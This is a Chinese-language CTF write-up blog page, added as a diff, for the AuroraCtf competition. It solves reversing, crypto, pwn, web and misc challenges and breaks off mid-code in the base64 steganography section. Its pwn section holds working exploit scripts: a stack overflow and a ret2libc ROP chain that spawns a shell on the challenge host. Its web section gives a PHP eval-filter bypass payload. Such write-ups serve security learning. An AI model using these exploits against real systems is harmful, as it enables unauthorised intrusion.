@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html>
+  <head>
+      
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- CSS -->
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="/ctf/AuroraCtfWriteup.html">
+  <link rel="alternate" type="application/rss+xml" title="sofiesJian" href="/feed.xml">
+
+<!-- Google font -->
+
+  <!-- <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Noto Sans"> -->
+
+<!-- font awesome -->
+
+<link rel="stylesheet" href="/css/font-awesome/css/font-awesome.min.css">
+
+</head>
+
+
+  <!--  -->
+
+  
+
+  </head>
+
+  <body>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>AuroraCtf</title>
+  <link rel="icon" href="/img/madaoIcon.ico" type="image/x-icon">
+  <meta name="description" content="REre_signup进去main F5就可以看到那一大坨赋值语句int __cdecl main(int argc, const char **argv, const char **envp){  char v4; // [rsp+0h] [rbp-D8h]  char v5; // [rsp+1h] [rbp...">
+</head>
+
+
+  <div class="wrapper">
+          <header class="post-header">
+	<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=default"></script>
+    <center><div class="post-title" itemprop="name headline">AuroraCtf</div>
+
+		<div class="post-meta"><i class="fa fa-calendar-o"></i> <time datetime="01 Jan 2019" itemprop="datePublished">Jan 1 2019</time>
+
+		&nbsp;&nbsp;•&nbsp;&nbsp;<i class="fa fa-user-secret"></i> <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">sofiesJian</span>
+        
+		<br>
+	</div>
+
+        
+        <div class="post-tags">
+        
+		<a class="post-tags-item" href="/tags/">cft</a>
+        
+	</div>
+    </center>
+    
+</header>
+
+<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+<div class="post-content">
+    <center>
+	
+	<p>差点翻车</p>
+	
+    </center>
+	<h2>Directory</h2>
+</div>
+
+<div id="category"></div>
+
+<div class="post-content" itemprop="articleBody">
+    <h2 id="re">RE</h2>
+
+<h3 id="re_signup">re_signup</h3>
+
+<p>进去main F5就可以看到那一大坨赋值语句
+<br /></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char v4; // [rsp+0h] [rbp-D8h]
+  char v5; // [rsp+1h] [rbp-D7h]
+  char v6; // [rsp+2h] [rbp-D6h]
+  char v7; // [rsp+3h] [rbp-D5h]
+  char v8; // [rsp+4h] [rbp-D4h]
+  char v9; // [rsp+5h] [rbp-D3h]
+  char v10; // [rsp+6h] [rbp-D2h]
+  char v11; // [rsp+7h] [rbp-D1h]
+  char v12; // [rsp+8h] [rbp-D0h]
+  char v13; // [rsp+9h] [rbp-CFh]
+  char v14; // [rsp+Ah] [rbp-CEh]
+  char v15; // [rsp+Bh] [rbp-CDh]
+  char v16; // [rsp+Ch] [rbp-CCh]
+  char v17; // [rsp+Dh] [rbp-CBh]
+  char v18; // [rsp+Eh] [rbp-CAh]
+  char v19; // [rsp+Fh] [rbp-C9h]
+  char v20; // [rsp+10h] [rbp-C8h]
+  char v21; // [rsp+11h] [rbp-C7h]
+  char v22; // [rsp+12h] [rbp-C6h]
+  char v23; // [rsp+13h] [rbp-C5h]
+  char v24; // [rsp+14h] [rbp-C4h]
+  char v25; // [rsp+15h] [rbp-C3h]
+  char v26; // [rsp+16h] [rbp-C2h]
+  char v27; // [rsp+17h] [rbp-C1h]
+  char v28; // [rsp+18h] [rbp-C0h]
+  char v29; // [rsp+19h] [rbp-BFh]
+  char v30; // [rsp+1Ah] [rbp-BEh]
+  char v31; // [rsp+1Bh] [rbp-BDh]
+  char v32; // [rsp+1Ch] [rbp-BCh]
+  char v33; // [rsp+1Dh] [rbp-BBh]
+  char v34; // [rsp+1Eh] [rbp-BAh]
+  char v35; // [rsp+1Fh] [rbp-B9h]
+  char v36; // [rsp+20h] [rbp-B8h]
+  char v37; // [rsp+21h] [rbp-B7h]
+  char v38; // [rsp+22h] [rbp-B6h]
+  char v39; // [rsp+23h] [rbp-B5h]
+  char v40; // [rsp+24h] [rbp-B4h]
+  char v41; // [rsp+25h] [rbp-B3h]
+  char v42; // [rsp+26h] [rbp-B2h]
+  char v43; // [rsp+27h] [rbp-B1h]
+  char v44; // [rsp+28h] [rbp-B0h]
+  unsigned __int64 v45; // [rsp+C8h] [rbp-10h]
+
+  v45 = __readfsqword(0x28u);
+  puts("   _____                                    ");
+  puts("  /  _  \\  __ _________  ________________   ");
+  puts(" /  /_\\  \\|  |  \\_  __ \\/  _ \\_  __ \\__  \\  ");
+  puts("/    |    \\  |  /|  | \\(  &lt;_&gt; )  | \\// __ \\_");
+  puts("\\____|__  /____/ |__|   \\____/|__|  (____  /");
+  puts("        \\/                               \\/ ");
+  __printf_chk(1LL, "Please input your flag:");
+  __isoc99_scanf("%s", &amp;v4);
+  if ( v9 == byte_201018
+    &amp;&amp; v31 == byte_201017
+    &amp;&amp; v33 == byte_20101B
+    &amp;&amp; v5 == byte_201022
+    &amp;&amp; v4 == byte_201016
+    &amp;&amp; v40 == byte_201013
+    &amp;&amp; v13 == byte_20101D
+    &amp;&amp; v35 == byte_201021
+    &amp;&amp; v37 == byte_201023
+    &amp;&amp; v7 == byte_201020
+    &amp;&amp; v14 == byte_201019
+    &amp;&amp; v36 == byte_201012
+    &amp;&amp; v43 == byte_201014
+    &amp;&amp; v15 == byte_201010
+    &amp;&amp; v36 == v38
+    &amp;&amp; v22 == byte_201015
+    &amp;&amp; v11 == byte_201024
+    &amp;&amp; v31 == v21
+    &amp;&amp; v44 == byte_201026
+    &amp;&amp; v23 == byte_20101C
+    &amp;&amp; v11 == v26
+    &amp;&amp; v31 == v18
+    &amp;&amp; v36 == v12
+    &amp;&amp; v15 == v27
+    &amp;&amp; v31 == v34
+    &amp;&amp; v31 == v25
+    &amp;&amp; v42 == byte_20101F
+    &amp;&amp; v15 == v20
+    &amp;&amp; v35 == v28
+    &amp;&amp; v41 == byte_201011
+    &amp;&amp; v10 == byte_201025
+    &amp;&amp; v22 == v19
+    &amp;&amp; v15 == v32
+    &amp;&amp; v30 == byte_20101A
+    &amp;&amp; v35 == v8
+    &amp;&amp; v35 == v39
+    &amp;&amp; v35 == v6
+    &amp;&amp; v16 == byte_20101E
+    &amp;&amp; v36 == v24
+    &amp;&amp; v13 == v29
+    &amp;&amp; v36 == v17 )
+  {
+    puts("Well down.");
+  }
+  return 0;
+}
+</code></pre></div></div>
+
+<p>然后直接双击去copy静态变量的数据下来</p>
+
+<p><img src="/img/AuroraCtf/re_signup/byte.png" alt="static data" /></p>
+
+<p>直接把变量之间的比较变成赋值,同时对调两个局部变量赋值的位置直接跑就可以了.</p>
+
+<h3 id="div">div</h3>
+
+<p>上来先看readme可以看到</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -DN=$N -O2 -c div.c -o div.o
+</code></pre></div></div>
+
+<p>知道是编译器优化,再看代码</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>long long mod(long long numerator){
+    long long denominator, remainder;
+    denominator = N;
+    remainder = numerator / denominator;
+    return remainder;
+}
+
+</code></pre></div></div>
+
+<p>可以看这个贴子说的除法优化.
+<a href="https://www.cnblogs.com/shines77/p/4189074.html">点我</a>
+<br />
+丢进去ida可以找到m和k
+<img src="/img/AuroraCtf/div/asse.png" alt="static data" />
+因为是64位程序,所以不是32+30,而是64+30,2^94//m就好了.
+<br />
+结果是2333333332,但是c都是向下取整的,所以这里加1.
+<br />
+<strong>flag:Aurora{2333333333}</strong></p>
+
+<h3 id="slow">slow</h3>
+
+<p>丢进去ida可以进去main可以看到要先求dword201014.
+<img src="/img/AuroraCtf/slow/fb2.png" alt="slowImage" />
+进去函数,很明显是斐波那契数列,
+<img src="/img/AuroraCtf/slow/fbnq.png" alt="slowImage" />
+直接自己求就可以,因为是取低8位,所以可以每次求完都mod一次255,不用大数.
+<br />
+结果是123,但是我总觉得这里少求了一次,然后就是按位异或就可以拿到flag
+<img src="/img/AuroraCtf/slow/yihuo.png" alt="slowImage" />
+<img src="/img/AuroraCtf/slow/flag.png" alt="slowImage" /></p>
+
+<h3 id="crypto">crypto</h3>
+
+<p>这题比较繁琐,进去main可以看到输入长度必须是59.
+<img src="/img/AuroraCtf/crypto/main.png" alt="crypto" /></p>
+
+<p>进去sub88A看,
+<img src="/img/AuroraCtf/crypto/bit.png" alt="crypto" />
+mlgb的吓死老夫了,有点烦不想看它们的优先级了,直接ctrl c ctrl v出来跑可以求到v2是2.
+然后看那个循坏,每一轮用4个byte加密3个byte,每次加密的bit数上面图写出来了.找到index,异或回去就可以.
+代码</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>en=r'QXVyb3Jhe3IzcGw0YzNtM250X3Q0YmwzNV80cjNfNTBtM3QxbTM1XzRfazN5X2JyMzRrdGhyMHVnaH0='
+abc=r'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+v5=0
+result=[0]*60
+for i in range(20):
+    i=i*4
+    t=i
+    index=abc.index(en[t])
+    a1v5h6=index*4
+
+    t=i+1
+    index=abc.index(en[t])
+    a1v5l2=(index&amp;0x30)//16
+    a1v51h4=index&amp;15
+
+    t=i+2
+    index=abc.index(en[t])
+    a1v51l4=(index//4)&amp;15
+    a1v52h2=(index&amp;0x3)*(2**6)
+    # print(a1v52h2)
+
+    a1v5=a1v5h6+a1v5l2                  #v5
+    a1v51=a1v51h4*16+a1v51l4
+    result[v5]=a1v5                      #v5
+    result[v5+1]=a1v51                   #v5+1
+
+    if i==19*4:
+        break
+    t=i+3
+    index=abc.index(en[t])
+    a1v52l6=index
+
+    a1v52=a1v52l6+a1v52h2
+    result[v5+2]=a1v52                   #v5+2
+
+    v5+=3
+print(result)
+for i in range(59):
+    print(chr(result[i]),end='')
+</code></pre></div></div>
+
+<h3 id="maze">maze</h3>
+
+<p>这道也很复杂,直接看这三个主要的函数</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s; // [rsp+0h] [rbp-10010h]
+  unsigned __int64 v5; // [rsp+10008h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  memset(&amp;s, 0, 0xFFFFuLL);
+  printf("input:", 0LL);
+  __isoc99_scanf("%s", &amp;s);
+  if ( (unsigned int)create_path((__int64)&amp;s) &amp;&amp; (unsigned int)check() )
+    puts("Congratulations! Flag is your input!");
+  else
+    puts("Wrong!");
+  return 0;
+}
+
+signed int *__fastcall create_path(__int64 a1)
+{
+  signed int *result; // rax
+  signed int v2; // eax
+  signed int i; // [rsp+1Ch] [rbp-4h]
+
+  if ( strlen((const char *)a1) != 34 )
+    return 0LL;
+  if ( strncmp((const char *)a1, "Aurora{", 7uLL) )
+    return 0LL;
+  result = (signed int *)*(unsigned __int8 *)(a1 + 33);
+  if ( (_BYTE)result != 125 )
+    return 0LL;
+  for ( i = 0; i &lt;= 25; ++i )
+  {
+    v2 = *(char *)(i + 7LL + a1);
+    if ( v2 == 100 )
+    {
+      result = path;
+      path[i] = 1;
+    }
+    else if ( v2 &gt; 100 )
+    {
+      if ( v2 == 115 )
+      {
+        result = path;
+        path[i] = 3;
+      }
+      else
+      {
+        if ( v2 != 119 )
+        {
+LABEL_18:
+          puts("Invalid input!");
+          return 0LL;
+        }
+        result = path;
+        path[i] = 2;
+      }
+    }
+    else
+    {
+      if ( v2 != 97 )
+        goto LABEL_18;
+      result = path;
+      path[i] = 0;
+    }
+  }
+  return result;
+}
+
+
+signed __int64 check()
+{
+  signed int v1; // [rsp+0h] [rbp-Ch]
+  signed int v2; // [rsp+4h] [rbp-8h]
+  signed int i; // [rsp+8h] [rbp-4h]
+
+  v1 = 4;
+  v2 = 5;
+  for ( i = 0; i &lt;= 25; ++i )
+  {
+    v1 += y_op[path[i]];
+    v2 += x_op[path[i]];
+    if ( v2 &gt; 9 || v2 &lt; 0 || v1 &gt; 9 || v1 &lt; 0 )
+      return 0LL;
+    if ( maze[10 * v1 + v2] == 35 )
+      return 0LL;
+    if ( maze[10 * v1 + v2] == 43 )
+      return 1LL;
+  }
+  return 0LL;
+}
+
+
+</code></pre></div></div>
+<p>从__fastcall create_path可以看出输入的字符长度限定了,还有一个for循环检测自己仔细看可以发现可以输入的其实是wasd四个字符对应0123(顺序不一定是这个).
+然后去到check函数,去找y_op,x_op
+<img src="/img/AuroraCtf/maze/xy.png" alt="crypto" />
+看到xy数组分别是</p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>x</td>
+      <td>-1</td>
+      <td>1</td>
+      <td>0</td>
+      <td>0</td>
+    </tr>
+    <tr>
+      <td>y</td>
+      <td>0</td>
+      <td>0</td>
+      <td>-1</td>
+      <td>1</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>对应着上下左右
+copy maze变量打印出来
+<img src="/img/AuroraCtf/maze/maze.png" alt="crypto" />
+然后就是wasd的事情了</p>
+
+<h3 id="forest">forest</h3>
+<p>一开始这题有点懵逼.后来发现是树就简单多了.
+进去main
+<img src="/img/AuroraCtf/forest/main.png" alt="forestMain" />
+上面的三个函数分别是前序中序后序遍历.
+<br />
+中序如下,左边递归,中间赋值,右边递归</p>
+
+<p><img src="/img/AuroraCtf/forest/inOrder.png" alt="forestinorder" />
+后序,左边递归,右边递归,中间赋值
+<img src="/img/AuroraCtf/forest/postOrder.png" alt="forestpostorder" />
+先序,中间赋值,左边递归,右边递归
+<img src="/img/AuroraCtf/forest/preOrder.png" alt="forestpreorder" />
+这题如果看出是数据结构的树逆向方面不难,难在代码还原,其实一般的还原是很好写的,但是这里面有
+<br />
+<strong>重复字符</strong>
+<strong>重复字符</strong>
+<strong>重复字符</strong>
+<br />
+这里害我调试调了半天,如果有重复字符的话还原回来的结果不是唯一的而且代码比较繁琐,所以这里可以自己手动调一下把上下重复的字符替换一下.
+<br />
+代码如下,但是RPQ分别替换了原来位置的字符,输出的时候自己在替换回去.</p>
+
+<p><img src="/img/AuroraCtf/forest/result.png" alt="forestresult" /></p>
+
+<p>而且最后结果<strong>}</strong>的位置也错了,自己换一下就好
+<br /></p>
+
+<p>代码</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+static char postOrder[]="raod5{RP_13rvQump1rt0_t#n#}#4yA";
+static int sp=0;
+static int pp=30;
+static struct node
+{
+    char d;
+    int l;
+    int r;
+    
+}tree[32];
+
+char * find(char*s,char c)
+{
+    for (int i=0;s[i]!='\0';i++)
+    {
+        if (s[i]==c)
+        {
+            return s+i;
+        }
+    }
+
+}
+
+void solve(int np,char*instr,int l)
+{
+    tree[np].d=postOrder[pp--];
+    char* cp=find(instr,tree[np].d);
+    tree[np].l=-1;
+    tree[np].r=-1;
+    if (cp!=instr+l-1)
+    {
+        tree[np].r=sp++;
+        solve(tree[np].r,cp+1,instr+l-cp-1);
+    }
+    if (cp!=instr)
+    {
+        tree[np].l=sp++;
+        solve(tree[np].l,instr,cp-instr);
+    }
+}
+void preorder(int root)
+{
+    // printf("%d",root);
+    if (root==-1)
+        return;
+    printf("%c",tree[root].d);
+    preorder(tree[root].l);
+    preorder(tree[root].r);
+}
+int main(int argc, char const *argv[])
+{
+    
+    int root=sp++;
+    char inOrder[]="roaRd{5uP1_Q3vrAm1p_r0tytn#4##}";
+    solve(root,inOrder,31);
+    preorder(root);
+    return 0;
+}
+
+</code></pre></div></div>
+
+<h2 id="pwn">pwn</h2>
+
+<h3 id="ret2text">ret2text</h3>
+
+<p>很基础的题直接覆盖返回地址到vuln就可以,溢出点
+<img src="/img/AuroraCtf/ret2text/vuln.png" alt="ret2text" />
+s到栈底16个字节加上4个字节给栈底,然后就是返回地址了直接返回到0804851b
+<img src="/img/AuroraCtf/ret2text/sh.png" alt="ret2text" />
+代码</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import socket
+a=socket.socket()
+addr=('aurora.52szu.tech', 10001)
+a.connect(addr)
+c='\x08'*16
+print(a.recv(100))
+a.send(c.encode()+int('ffffd398',base=16).to_bytes(4,'little')+int('0804851B',base=16).to_bytes(4,'little')+'\n'.encode())
+print(a.recv(100))
+print(a.recv(100))
+</code></pre></div></div>
+
+<h3 id="铁拳先锋">铁拳先锋</h3>
+
+<p>进去main看到几个函数一个个检查,发现在睡觉的时候攻击力乘2(相当于左移).
+<img src="/img/AuroraCtf/overwatch/vuln.png" alt="vuln" />
+那么就可以多次乘二之后让攻击力变为0.
+<br />
+直接睡觉16次然后干它
+<img src="/img/AuroraCtf/overwatch/num.png" alt="sleep" />
+拿到flag
+<img src="/img/AuroraCtf/overwatch/flag.png" alt="flag" /></p>
+
+<h3 id="guessnumber">guessNumber</h3>
+
+<p>这题也不难,c的随机数都是伪随机数,丢进ida可以看到种子在输入名字之前就求得到了,而且名字的变量在种子之前.
+<img src="/img/AuroraCtf/guessNumber/vuln.png" alt="vuln" />
+所以可以直接覆盖掉种子的值,直接输入一堆10个a跟着gdb调试每次停下来看了再输入数字.
+最后拿到shell
+<img src="/img/AuroraCtf/guessNumber/flag.png" alt="shell" /></p>
+
+<h3 id="format1">format1</h3>
+
+<p>printf 会向遇到要格式化的字符就向栈找参数.丢进ida可以看到key已经被读进了v5,也就是在栈当中,
+<img src="/img/AuroraCtf/format/key.png" alt="key" />
+直接输入多个 <strong>%d.</strong> 就可以读到栈里面的数字.
+但是这个是64位的程序,还会有用寄存器传参,不想算它有几个寄存器直接多读几个一个个试就可以.
+<img src="/img/AuroraCtf/format/flag.png" alt="flag" /></p>
+
+<h3 id="ret2libc">ret2libc</h3>
+
+<p>这题比较难,先要了解一下plt,也就是动态链接的时候,导入其他模块的函数使用,会把函数地址导入到plt上(第一次调用时再填充地址),
+然后在call [pltAddr]来调用其他模块的函数.这里程序加载的机制是确定的,但是外部模块的基址是变化的,所以我们的目标是先拿到基址计算出system的地址再调用system(“/bin/sh”).
+<br />
+这题难是难在怎么设置参数上,64位的程序用寄存器传参所以我们在调用函数的时候首先要把寄存器的值设置好.绝望之下在ida搜ret,发现这么一段
+<img src="/img/AuroraCtf/ret2libc/csuinit.png" alt="flagcsuinit" />
+通过设置好栈返回到400706设置好r12到r15再返回到4006e8设置edi的值并调用put函数返回地址.
+<br />
+payload写得比较粗糙</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import socket
+# 自己建套接字连过去
+#第一次拿地址
+a=socket.socket()
+a.connect(address)
+pl=b'a'*0x100+0x00007fffffffe230.to_bytes(8,'little')
+pl+=0x400706.to_bytes(8,'little') # ret
+pl+=0x400706.to_bytes(8,'little')#  add rsp
+pl+=0x0.to_bytes(8,'little')#  rbx
+pl+=0x1.to_bytes(8,'little')# rbp
+pl+=0x601018.to_bytes(8,'little')# r12 call puts  puts的地址让他打印自己的plt上的地址
+pl+=0x0.to_bytes(8,'little')# r13 rdx
+pl+=0x601018.to_bytes(8,'little')#r14 rsi puts.got
+pl+=0x601018.to_bytes(8,'little')#r15 rdi puts.got
+pl+=0x4006e6.to_bytes(8,'little')#xor ebx rbx(第二次)
+
+pl+=0x4006e6.to_bytes(8,'little')#add rsp
+pl+=0x4006e6.to_bytes(8,'little')#pop rbx
+pl+=0x7fffffffd580.to_bytes(8,'little')#rbp  
+pl+=0x4006e6.to_bytes(8,'little')#r12
+pl+=0x4006e6.to_bytes(8,'little')#r13
+pl+=0x4006e6.to_bytes(8,'little')#r14
+pl+=0x4006e6.to_bytes(8,'little')#r15
+pl+=0x400626.to_bytes(8,'little')#ret
+pl+=b'\n'
+a.send(pl)
+print(a.recv(1000))
+</code></pre></div></div>
+
+<p>第一次拿到puts的地址可以计算到system的地址为sa,然后第二次调用gets把地址写入bss段</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pl+=b'a'*0x100+0x00007fffffffe230.to_bytes(8,'little')
+pl+=0x400706.to_bytes(8,'little') # ret
+pl+=0x400706.to_bytes(8,'little')#  add rsp
+pl+=0x0.to_bytes(8,'little')#  rbx
+pl+=0x1.to_bytes(8,'little')# rbp
+pl+=0x601028.to_bytes(8,'little')# r12 call gets  调用 gets把system的地址和字符串/bin/sh写入bss段601038处
+pl+=0x0.to_bytes(8,'little')# r13 rdx
+pl+=0x601038.to_bytes(8,'little')#r14 rsi puts.got
+pl+=0x601038.to_bytes(8,'little')#r15 rdi puts.got
+pl+=0x4006e6.to_bytes(8,'little')#xor ebx rbx(第二次)
+
+pl+=0x4006e6.to_bytes(8,'little')#add rsp
+pl+=0x4006e6.to_bytes(8,'little')#pop rbx
+pl+=0x7fffffffd580.to_bytes(8,'little')#rbp  
+pl+=0x4006e6.to_bytes(8,'little')#r12
+pl+=0x4006e6.to_bytes(8,'little')#r13
+pl+=0x4006e6.to_bytes(8,'little')#r14
+pl+=0x4006e6.to_bytes(8,'little')#r15
+pl+=0x400626.to_bytes(8,'little')#ret
+pl+=b'\n'
+</code></pre></div></div>
+
+<p>接下来这一次输入是输入system的地址和字符串/bin/sh到601038上</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pl2=sa.to_bytes(8,'little')+b'/bin/sh'+0x0.to_bytes(8,'little')+b'\n'
+a.send(pl2)
+</code></pre></div></div>
+
+<p>第三次调用system反弹shell</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pl=b'a'*0x100+0x00007fffffffe230.to_bytes(8,'little')
+pl+=0x400706.to_bytes(8,'little') # ret
+pl+=0x400706.to_bytes(8,'little')#  add rsp
+pl+=0x0.to_bytes(8,'little')#  rbx
+pl+=0x1.to_bytes(8,'little')# rbp
+pl+=0x601038.to_bytes(8,'little')# r12 call   system
+pl+=0x0.to_bytes(8,'little')# r13 rdx
+pl+=0x601040.to_bytes(8,'little')#r14 rsi  address of  /bin/sh
+pl+=0x601040.to_bytes(8,'little')#r15 rdi  address of  /bin/sh 
+pl+=0x4006e6.to_bytes(8,'little')#xor ebx rbx(第二次)
+
+pl+=0x4006e6.to_bytes(8,'little')#add rsp
+pl+=0x4006e6.to_bytes(8,'little')#pop rbx
+pl+=0x7fffffffd580.to_bytes(8,'little')#rbp  
+pl+=0x4006e6.to_bytes(8,'little')#r12
+pl+=0x4006e6.to_bytes(8,'little')#r13
+pl+=0x4006e6.to_bytes(8,'little')#r14
+pl+=0x4006e6.to_bytes(8,'little')#r15
+pl+=0x400626.to_bytes(8,'little')#ret
+
+pl+=b'\n'
+</code></pre></div></div>
+
+<h2 id="web">web</h2>
+
+<p>web我不太懂,基本只会签到题</p>
+
+<h3 id="ssti">ssti</h3>
+
+<p>这题纯google回来的,大概意思是多套一层<strong>{}</strong>会让里面的代码执行,直接输入就可以拿到flag.
+<img src="/img/AuroraCtf/ssti/flag.png" alt="flagssti" /></p>
+
+<h3 id="php-revenger">php Revenger</h3>
+
+<p>进来先F12可以看到,代码地址在 /code flag在当前目录.
+<img src="/img/AuroraCtf/phpRevenge/f12.png" alt="f12PhpRevenge" />
+<br />
+然后直接在地址后面加/code拿到代码</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="nv">$code</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'code'</span><span class="p">];</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$code</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="s1">';'</span> <span class="o">===</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[a-z]+\((?R)?\)/'</span><span class="p">,</span> <span class="k">NULL</span><span class="p">,</span> <span class="nv">$code</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/serialize|crypt|readfile|if|time|local|sqrt|et|na|nt|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i'</span><span class="p">,</span> <span class="nv">$code</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="k">echo</span> <span class="s1">'bye~'</span><span class="p">;</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="k">eval</span><span class="p">(</span><span class="nv">$code</span><span class="p">);</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+        <span class="k">else</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">"No way!!!"</span><span class="p">;</span>
+        <span class="p">}</span>
+<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">"No way!!!"</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>这题搜了我很久才做出来,google搜php无参数可以搜到一堆,但是网上的方法大部分都被过滤掉了.
+<br />
+我的做法是这个
+<br />
+echo(next(file(end(scandir(chr(ceil(sinh(cosh(tan(floor(sinh(cosh(
+    <br />
+    chdir(next(scandir(chr(ceil(sinh(cosh(tan(floor(sinh(cosh(sin(cosh(sin(cosh(sin(cosh(sin(cosh(phpversion()))))))))))))))))))))))))))))))));
+<br />
+首先最里面的那一层
+ceil(sinh(cosh(tan(floor(sinh(cosh(sin(cosh(sin(cosh(sin(cosh(sin(cosh(phpversion
+是为了返回一个46,关键在于phpversion返回了一个数字,然后通过数学运算拿到46,看着很长其实只需要知道sin(conh())会变小,sinh(conh())会变大就可以了,等拿到了<strong>2.x</strong>的时候就套ceil(sinh(cosh(tan(floor,这样就可以拿到46.
+<br />
+然后通过
+chdir(next(scandir(chr
+就可以改变当前目录,并且返回一个1,同样的道理用sinh(conh())往1上套知道它变成2.x就再套echo(next(file(end(scandir(chr(,
+file是打开文件并以数组形式返回每行字符(这个找了我超久).echo输出.
+<br />
+拿到flag
+<img src="/img/AuroraCtf/phpRevenge/flag.png" alt="codePhpRevenge" /></p>
+
+<h2 id="crypto-1">Crypto</h2>
+
+<h3 id="bigrsa">bigRsa</h3>
+<p>关于rsa感觉套路比较固定,网上有比较多的教程.可以看一下这个
+<a href="blog.woshijianjian.xyz">待补的连接</a>
+<br />
+这题是e很大,可以用wiener,当我试图看懂原理的时候发现当年多的信安数学都拿去喂狗了.
+<img src="/img/AuroraCtf/bigrsa/calc.png" alt="flagBigRsa" /></p>
+
+<h3 id="first">first</h3>
+
+<p>一直变成字节流然后decode成base64就可以</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>a=3213211# a long number
+from Crypto.Util.number import long_to_bytes
+import base64
+for i in range(num):
+    b=long_to_bytes(a) 
+    a=base64.b64decode(b)
+
+# until raise an error
+print(a,b)
+</code></pre></div></div>
+
+<p><img src="/img/AuroraCtf/first/flag.png" alt="first" /></p>
+
+<h3 id="little-rsa">little rsa</h3>
+
+<p>e特别小c特别大且与n非常的接近猜测m是c+i*n</p>
+
+<p><img src="/img/AuroraCtf/littleRsa/flag.png" alt="littleRsa" /></p>
+
+<h3 id="aurora">Aurora</h3>
+<p>RSA共模攻击看代码可以发现几段密文的n是一样的,只要存在e1和e2互素那么就必然存在(数学上是可以证明的,反正我忘了),
+s1*e1+s2*e2=1那么就可以用
+<script type="math/tex">c1^s1*c2^s2=m^{e1*s1+e2*s2}=m^1 mod(n)</script>
+来求得原文,没截图以后补.</p>
+
+<h3 id="baserandom">baseRandom</h3>
+<p>可以构造一个用6比特表示的0~63的数拼起来变16进制发过去就可以拿到randomTable</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import base64
+import socket
+a=socket.socket()
+#a.connect(addr)
+
+result=""
+for i in range(64):
+    result+=bin(i)[2:].zfill(6)
+# 结果前面补两个00 因为0和1在一起前面的8个0被省略了
+b='00'+hex(int(result,2))[2:]
+#send b.encode()
+a.send(b.encode())
+a.recv(1000)# recv randomTable
+flag="y0oBJYAifDhnN0AF0Yv+0DnF1SoBNVutw0Kn0DsFKsQ6/potKoQ9JYA2K0t="
+classic_b64table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+random_b64table = "C36z5sSExAabmuLMyvkPHoV0NKwJ/1fTgiZ2Rn9plejX7WF+IhBrtUDYcd8GOQ4q"
+table = "".maketrans( random_b64table,classic_b64table)
+print(base64.b64decode(flag.translate(table).encode()))
+</code></pre></div></div>
+
+<h2 id="misc">misc</h2>
+
+<h3 id="base64_stego">base64_stego</h3>
+<p>base64的隐写术
+<a href="https://www.jianshu.com/p/4f6ec361ef17">点我看攻略</a>
+<br />
+上代码</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+import base64
+bs=''
+def de(s):
+    global bs
+    table="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+    s=s[len(s)-4:]
+    os=base64.b64encode(base64.b64decode(s)).decode()
+    if s.count('=')==1:
+        bs+=bin(table.index(s[-2])-table.index(os[-2]))[2:].zfill(2)
+        print(bin(table.index(s[-2])-table.index(os[-2])))
+    elif s.count('=')==2:
+        print(bin(table.index(s[-3])-table.index(os[-3])))
+        bs+=bin(table.index(s[-3])-table.index(os[-3]))[2:].zfill(4)
+
+with open(r'C:\Users\sofiesJian\Desktop\base64.txt','r')as f:
